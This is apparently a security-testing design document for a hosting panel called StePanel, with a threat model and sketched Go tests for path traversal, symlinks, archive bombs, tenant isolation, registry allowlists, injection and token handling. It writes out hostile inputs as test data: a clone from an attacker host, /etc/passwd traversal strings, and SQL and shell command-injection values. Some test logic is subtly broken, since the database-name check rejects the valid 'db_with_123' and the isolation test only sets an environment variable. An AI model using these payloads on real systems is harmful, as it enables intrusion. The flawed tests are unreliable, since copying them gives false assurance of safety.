# Adversarial Testing: Prove Safety Under Hostile Conditions

## Philosophy

StePanel touches root, deletes data, restores data, and runs customer code.

**Test assumption**: Every input is hostile. Every execution environment is compromised. Every feature fails safely or fails loudly.

Not: "This is probably safe."  
Yes: "This fails safely under adversarial input."

## Threat Model

### Compromised Customer Code
```
Customer pushes: git clone https://attacker.com/backdoor
StePanel executes: git clone, npm install, php composer
Threat: Attacker code runs with site privileges
Defense: Process isolation, read-only base filesystem, network constraints
```

### Compromised Dependencies
```
Customer uses: pip install some-popular-package
Attacker publishes: same-popular-package v2.0.1 (malicious)
StePanel installs: malicious version
Threat: Attacker code runs as site user
Defense: Pinned versions, signature verification, no-index installs
```

### Leaked API Token
```
Attacker has: stp_...
Threat: Delete sites, restore arbitrary backups, create databases
Defense: Token expiration, scoped permissions, rate limiting, audit logging
```

### Path Traversal
```
Attacker uploads: backup with ../../etc/passwd
StePanel extracts: overwrites system files
Threat: System compromise
Defense: Reject ../, absolute paths, symlinks; ensureInside() validation
```

### Symlink Attack
```
Attacker creates: /data/sites/attacker-site/www/real -> /etc
StePanel restores: deletes symlink's target
Threat: System file deletion
Defense: O_NOFOLLOW, refuse symlink parents, per-file validation
```

## Test Categories

### 1. Input Validation Tests

**Path Escapes**:
```go
testCases := []string{
    "../../../etc/passwd",
    "/../etc/passwd",
    "/etc/passwd",
    "./../../etc/passwd",
    "etc/passwd/../../../passwd",
}
for _, path := range testCases {
    _, err := safePath(rootDir, path)
    if err == nil {
        t.Fatalf("path escape not rejected: %s", path)
    }
}
```

**Symlinks**:
```go
testCases := []struct{
    name string
    setup func() string
}{
    {
        name: "symlink parent",
        setup: func() string {
            os.Symlink("/etc", "root/link")
            return "root/link/file"
        },
    },
    {
        name: "symlink chain",
        setup: func() string {
            os.Symlink("../../../", "root/a")
            return "root/a/file"
        },
    },
}
```

**Archive Path Traversal**:
```go
// Create malicious tar: archive containing ../../etc/passwd
tar := createMaliciousTarWithTraversal("../../etc/passwd")
err := extractArchive(tar, rootDir)
if err == nil {
    t.Fatal("traversal not rejected")
}
// Verify system files untouched
verifySystemFilesUntouched()
```

**Null Bytes**:
```go
testCases := []string{
    "file\x00.txt",
    "path\x00/to/file",
    "\x00root",
}
for _, path := range testCases {
    _, err := safePath(rootDir, path)
    if err == nil {
        t.Fatalf("null byte not rejected: %q", path)
    }
}
```

### 2. Privilege Boundary Tests

**Privilege Escalation Prevention**:
```go
// Try: can compromised site user become root?
func TestSiteUserCannotEscalatePrivilege(t *testing.T) {
    // Create site user
    siteUser := createSiteUser(t, "testsite")
    
    // Run command as site user
    cmd := exec.Command("sudo", "-u", siteUser, "id")
    output, _ := cmd.Output()
    
    // Verify still unprivileged
    if strings.Contains(string(output), "uid=0") {
        t.Fatal("site user escalated to root")
    }
}
```

**File Permission Enforcement**:
```go
// Verify: site user cannot read other site's data
func TestSiteIsolation(t *testing.T) {
    site1 := createSite(t, "site1")
    site2 := createSite(t, "site2")
    
    // Try to read site2 from site1
    cmd := exec.Command("cat", 
        filepath.Join(site2.DataDir, "private.txt"))
    cmd.Env = append(os.Environ(), "USER="+site1.User)
    
    if cmd.Run() == nil {
        t.Fatal("site isolation broken")
    }
}
```

### 3. Archive Extraction Tests

**Decompression Bomb**:
```go
// Create: 1GB file compressed to 1MB
// Try: extract with 100MB limit
func TestDecompressionBombRejected(t *testing.T) {
    bomb := createDecompressionBomb(1 * 1024 * 1024 * 1024) // 1GB
    
    _, err := extractArchiveWithLimit(bomb, 100 * 1024 * 1024)
    if err == nil {
        t.Fatal("decompression bomb not rejected")
    }
}
```

**Symlink Extraction**:
```go
// Create: tar containing symlink
// Try: extract
func TestSymlinksRejected(t *testing.T) {
    tarFile := createTarWithSymlink("link", "../../../etc/passwd")
    
    _, err := extractArchive(tarFile, rootDir)
    if err == nil {
        t.Fatal("symlink not rejected")
    }
}
```

**Absolute Paths**:
```go
// Create: tar with /etc/passwd entry
// Try: extract
func TestAbsolutePathsRejected(t *testing.T) {
    tar := createTarWithPath("/etc/passwd")
    
    _, err := extractArchive(tar, rootDir)
    if err == nil {
        t.Fatal("absolute path not rejected")
    }
}
```

### 4. Network Isolation Tests

**Helper Network Isolation**:
```go
// Verify: helper cannot reach external networks
func TestHelperNetworkIsolated(t *testing.T) {
    // Run helper in isolated network
    helper := startHelperWithNetworkConstraints()
    
    // Try to download package
    req := &PipInstallRequest{
        Package: "malicious-package",
    }
    
    // Should fail: no network access
    _, err := helper.Handle(req)
    if err == nil {
        t.Fatal("network access not blocked")
    }
}
```

**Container Image Pull Restriction**:
```go
// Verify: only allowed registries can be pulled
func TestContainerRegistryAllowlist(t *testing.T) {
    allowedRegistries := map[string]bool{
        "docker.io": true,
        "ghcr.io": true,
        "quay.io": true,
    }
    
    testCases := []struct{
        image string
        allowed bool
    }{
        {"nginx", true}, // implicit docker.io
        {"ghcr.io/user/image", true},
        {"attacker.com/malware", false},
        {"localhost:5000/internal", false},
    }
    
    for _, tc := range testCases {
        allowed := isAllowedRegistry(tc.image)
        if allowed != tc.allowed {
            t.Fatalf("%s: expected %v, got %v", tc.image, tc.allowed, allowed)
        }
    }
}
```

### 5. Backup/Restore Safety Tests

**Restore Doesn't Break Recovery**:
```go
// Verify: restoring backup doesn't make site unrecoverable
func TestRestorePreservesRecoveryJournal(t *testing.T) {
    site := createSite(t, "testsite")
    journal := createRecoveryJournal(site)
    
    // Restore backup
    backup := createBackup(site)
    restoreBackup(site, backup)
    
    // Verify recovery journal still valid
    if !isRecoveryJournalValid(journal) {
        t.Fatal("restore corrupted recovery journal")
    }
}
```

**Restore Respects Tenant Boundaries**:
```go
// Verify: can't restore site1's backup into site2
func TestCrossSiteRestoreBlocked(t *testing.T) {
    site1 := createSite(t, "site1")
    site2 := createSite(t, "site2")
    
    backup1 := createBackup(site1)
    
    // Try to restore site1's backup into site2
    err := restoreBackup(site2, backup1)
    if err == nil {
        t.Fatal("cross-site restore not blocked")
    }
}
```

### 6. Database Safety Tests

**SQL Injection Prevention**:
```go
// Database names and users shouldn't allow injection
func TestDatabaseNameValidation(t *testing.T) {
    testCases := []string{
        "normal_db",
        "db_with_123",
        "'; DROP TABLE users; --",
        "db$(whoami)",
        "db`whoami`",
        "../../../etc/passwd",
    }
    
    for _, name := range testCases {
        err := validateDatabaseName(name)
        if name[:1] == "n" && err != nil {
            t.Fatalf("valid name rejected: %s", name)
        }
        if name[:1] != "n" && err == nil {
            t.Fatalf("invalid name accepted: %s", name)
        }
    }
}
```

### 7. API Token Safety Tests

**Token Leakage Prevention**:
```go
// Verify: token never logged or exposed
func TestTokenNotExposedInLogs(t *testing.T) {
    token := createToken()
    
    // Use token in API call
    response := makeAPICall(token, "/api/sites")
    
    // Verify token not in logs
    logs := readLogs()
    if strings.Contains(logs, token) {
        t.Fatal("token exposed in logs")
    }
    
    // Verify token not in response
    if strings.Contains(response, token) {
        t.Fatal("token exposed in response")
    }
}
```

**Legacy Token Expiration**:
```go
// Verify: expired tokens are rejected
func TestExpiredTokenRejected(t *testing.T) {
    token := createLegacyToken()
    token.LegacyExpiresAt = time.Now().Add(-1 * time.Hour)
    
    _, err := authenticateToken(token)
    if err == nil {
        t.Fatal("expired token accepted")
    }
}
```

## Continuous Adversarial Testing

### Fuzzing
```go
// Fuzz archive path handling
func FuzzArchiveExtraction(f *testing.F) {
    f.Add([]byte{})
    f.Add([]byte("PK\x03\x04")) // ZIP header
    f.Add([]byte("\x1f\x8b\x08")) // gzip header
    
    f.Fuzz(func(t *testing.T, data []byte) {
        // Should never panic, always fail safely
        _, _ = extractArchive(data, "/tmp/test")
    })
}
```

### Continuous Scanning
```
CI Pipeline:
1. Run all adversarial tests
2. Fuzz critical paths (archive, paths, auth)
3. Verify no privilege escalation
4. Check network isolation
5. Validate recovery safety
```

## Success Criteria

✅ All malicious inputs rejected  
✅ No arbitrary code execution  
✅ No privilege escalation  
✅ No data leakage between tenants  
✅ Backups can always be recovered  
✅ Recovery journals always valid  
✅ Network isolation enforced  
✅ Symlinks and traversal rejected  
✅ Tokens expire as documented  
✅ All failures are safe (not "probably")  

---

**Test everything. Trust nothing. Fail safely.**
